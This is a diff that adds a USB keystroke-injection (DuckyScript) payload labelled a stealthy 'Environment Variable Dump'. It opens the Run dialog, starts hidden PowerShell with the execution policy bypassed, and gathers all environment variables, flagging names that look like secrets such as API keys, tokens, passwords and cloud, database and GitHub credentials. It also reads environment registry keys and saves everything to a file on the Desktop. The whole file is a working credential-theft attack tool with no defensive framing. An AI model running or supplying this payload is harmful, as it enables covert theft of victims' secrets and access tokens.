@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Environment Variable Dump
+REM  FLLC - by PERSON FU
+REM  Time: ~5 seconds | Stealth: HIGH
+REM  Full env vars + registry secrets + tokens
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\env_dump.txt';$r=@();$r+='=== ENVIRONMENT DUMP ===';$r+='Time: '+(Get-Date);$r+='';$r+='=== ALL ENVIRONMENT VARIABLES ===';[Environment]::GetEnvironmentVariables()|GetEnumerator|Sort Name|%{$r+=$_.Name+'='+$_.Value};$r+='';$r+='=== PATH ENTRIES ===';$env:PATH -split ';'|%{$r+=$_};$r+='';$r+='=== INTERESTING VARIABLES ===';'API_KEY','SECRET','TOKEN','PASSWORD','PASS','AWS_','AZURE_','GCP_','DATABASE_','DB_','REDIS_','MONGO','MYSQL','POSTGRES','SMTP','MAIL_','GITHUB_','GITLAB_','DOCKER_','KUBE_','NPM_','PYPI_'|%{$k=$_;[Environment]::GetEnvironmentVariables()|GetEnumerator|?{$_.Name -like \"*$k*\"}|%{$r+='[!] '+$_.Name+'='+$_.Value}};$r+='';$r+='=== REGISTRY SECRETS ===';@('HKCU:\Environment','HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment')|%{try{(Get-ItemProperty $_ -ea 0).PSObject.Properties|%{$r+=$_.Name+'='+$_.Value}}catch{}};$r|Out-File $o -Encoding UTF8"
+ENTER
+DELAY 500
